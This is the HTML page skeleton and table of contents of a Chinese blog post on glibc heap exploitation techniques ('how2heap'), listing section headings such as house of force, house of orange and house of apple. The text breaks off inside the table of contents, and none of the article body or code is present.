<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="hoe2heap!!">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap">
<meta property="og:url" content="https://ixout.github.io/posts/49295/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="hoe2heap!!">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/940906_U9ZGVURG434TPE6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/959842_STBECKY3R8W9W2A.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/959842_JDJKTRK7GJUEUFR.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/House-of-some.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/houseofsome2.png">
<meta property="article:published_time" content="2023-08-19T09:34:54.000Z">
<meta property="article:modified_time" content="2025-01-06T11:42:28.282Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="how2heap">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
        
      
    
    <!-- title -->
    <title>how2heap</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/posts/33400/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/posts/61238/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/49295/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/49295/&text=how2heap"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/49295/&is_video=false&description=how2heap"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=how2heap&body=Check out this article: https://ixout.github.io/posts/49295/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/49295/&title=how2heap"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/49295/&name=how2heap&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/49295/&t=how2heap"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">1.</span> <span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-29%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">2.29新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-force"><span class="toc-number">2.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B1"><span class="toc-number">2.2.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2"><span class="toc-number">2.2.2.</span> <span class="toc-text">示例2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">2.31新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">2.4.</span> <span class="toc-text">例题1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982"><span class="toc-number">2.5.</span> <span class="toc-text">例题2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-lore"><span class="toc-number">3.</span> <span class="toc-text">house of lore</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-2"><span class="toc-number">3.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange"><span class="toc-number">4.</span> <span class="toc-text">house of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-3"><span class="toc-number">4.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">4.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">4.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-rabbit"><span class="toc-number">5.</span> <span class="toc-text">house of rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-4"><span class="toc-number">5.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">5.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">5.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-roman"><span class="toc-number">6.</span> <span class="toc-text">house of roman</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-5"><span class="toc-number">6.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-number">6.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-pig"><span class="toc-number">7.</span> <span class="toc-text">house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-6"><span class="toc-number">7.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-6"><span class="toc-number">7.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-3"><span class="toc-number">7.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Corrosion"><span class="toc-number">8.</span> <span class="toc-text">House of Corrosion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-7"><span class="toc-number">8.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-7"><span class="toc-number">8.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">9.</span> <span class="toc-text">house of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-8"><span class="toc-number">9.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-8"><span class="toc-number">9.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">9.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">10.</span> <span class="toc-text">house of kiwi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-9"><span class="toc-number">10.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-9"><span class="toc-number">10.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-assert"><span class="toc-number">10.2.1.</span> <span class="toc-text">__malloc_assert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">10.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-storm"><span class="toc-number">11.</span> <span class="toc-text">house of storm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-10"><span class="toc-number">11.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-10"><span class="toc-number">11.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-3"><span class="toc-number">11.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-banana"><span class="toc-number">12.</span> <span class="toc-text">house of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-11"><span class="toc-number">12.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-11"><span class="toc-number">12.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-4"><span class="toc-number">12.3.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1-poc"><span class="toc-number">12.3.1.</span> <span class="toc-text">思路1-poc:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2-poc"><span class="toc-number">12.3.2.</span> <span class="toc-text">思路2-poc:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-4"><span class="toc-number">12.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-emma"><span class="toc-number">13.</span> <span class="toc-text">house of emma</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-12"><span class="toc-number">13.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-12"><span class="toc-number">13.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E5%8F%AF%E8%83%BD%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">13.2.1.</span> <span class="toc-text">实操可能的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-5"><span class="toc-number">13.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat"><span class="toc-number">14.</span> <span class="toc-text">house of cat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-13"><span class="toc-number">14.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-13"><span class="toc-number">14.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vtable%E6%A3%80%E6%9F%A5"><span class="toc-number">14.2.1.</span> <span class="toc-text">vtable检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-assert%E4%B8%8EFSOP"><span class="toc-number">14.2.2.</span> <span class="toc-text">__malloc_assert与FSOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%A7%8D%E5%8F%AF%E8%A1%8C%E7%9A%84IO%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">14.2.3.</span> <span class="toc-text">一种可行的IO调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-IO%E7%BB%93%E6%9E%84%E4%BD%93%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E7%9A%84%E6%A3%80%E6%B5%8B"><span class="toc-number">14.2.4.</span> <span class="toc-text">fake_IO结构体需要绕过的检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">14.2.5.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">14.2.6.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-6"><span class="toc-number">14.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple1"><span class="toc-number">15.</span> <span class="toc-text">house of apple1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-14"><span class="toc-number">15.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-14"><span class="toc-number">15.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">15.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%9A%E4%BF%AE%E6%94%B9tcache%E7%BA%BF%E7%A8%8B%E5%8F%98%E9%87%8F"><span class="toc-number">15.3.1.</span> <span class="toc-text">思路一：修改tcache线程变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9A%E4%BF%AE%E6%94%B9mp-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">15.3.2.</span> <span class="toc-text">思路二：修改mp_结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9A%E4%BF%AE%E6%94%B9pointer-guard%E7%BA%BF%E7%A8%8B%E5%8F%98%E9%87%8F%E4%B9%8Bhouse-of-emma"><span class="toc-number">15.3.3.</span> <span class="toc-text">思路三：修改pointer_guard线程变量之house of emma</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%9B%9B%EF%BC%9A%E4%BF%AE%E6%94%B9global-max-fast%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">15.3.4.</span> <span class="toc-text">思路四：修改global_max_fast全局变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-7"><span class="toc-number">15.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">16.</span> <span class="toc-text">house of apple2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-15"><span class="toc-number">16.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-15"><span class="toc-number">16.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">16.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-overflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">16.3.1.</span> <span class="toc-text">利用_IO_wfile_overflow函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">16.3.2.</span> <span class="toc-text">利用_IO_wfile_underflow_mmap函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wdefault-xsgetn%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">16.3.3.</span> <span class="toc-text">利用_IO_wdefault_xsgetn函数控制程序执行流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">16.4.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-apple3"><span class="toc-number">17.</span> <span class="toc-text">house of apple3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-16"><span class="toc-number">17.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-16"><span class="toc-number">17.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">17.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">17.3.1.</span> <span class="toc-text">利用_IO_wfile_underflow函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wfile-underflow-mmap%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81-1"><span class="toc-number">17.3.2.</span> <span class="toc-text">利用_IO_wfile_underflow_mmap函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-wdo-write%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">17.3.3.</span> <span class="toc-text">利用_IO_wdo_write函数控制程序执行流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-IO-wfile-sync%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">17.3.4.</span> <span class="toc-text">使用_IO_wfile_sync函数控制程序执行流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-6"><span class="toc-number">17.4.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">18.</span> <span class="toc-text">house of botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-17"><span class="toc-number">18.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-17"><span class="toc-number">18.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-7"><span class="toc-number">18.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-husk"><span class="toc-number">19.</span> <span class="toc-text">house of husk</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-18"><span class="toc-number">19.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-18"><span class="toc-number">19.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-8"><span class="toc-number">19.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-8"><span class="toc-number">19.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-snake"><span class="toc-number">20.</span> <span class="toc-text">house of snake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-19"><span class="toc-number">20.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-19"><span class="toc-number">20.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6"><span class="toc-number">20.2.1.</span> <span class="toc-text">绕过条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">20.2.2.</span> <span class="toc-text">函数调用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">20.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%881"><span class="toc-number">20.3.1.</span> <span class="toc-text">模板方案1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%882"><span class="toc-number">20.3.2.</span> <span class="toc-text">模板方案2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-snake2"><span class="toc-number">21.</span> <span class="toc-text">house of snake2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-20"><span class="toc-number">21.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-20"><span class="toc-number">21.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">21.2.1.</span> <span class="toc-text">绕过条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">21.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%881-1"><span class="toc-number">21.3.1.</span> <span class="toc-text">模板方案1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%882-1"><span class="toc-number">21.3.2.</span> <span class="toc-text">模板方案2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%A1%883"><span class="toc-number">21.3.3.</span> <span class="toc-text">模板方案3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81tls-dtor-list-%E5%88%A9%E7%94%A8-call-tls-dtors%E6%8B%BF%E5%88%B0%E6%9D%83%E9%99%90"><span class="toc-number">22.</span> <span class="toc-text">劫持tls_dtor_list,利用__call_tls_dtors拿到权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-21"><span class="toc-number">22.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-21"><span class="toc-number">22.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-some"><span 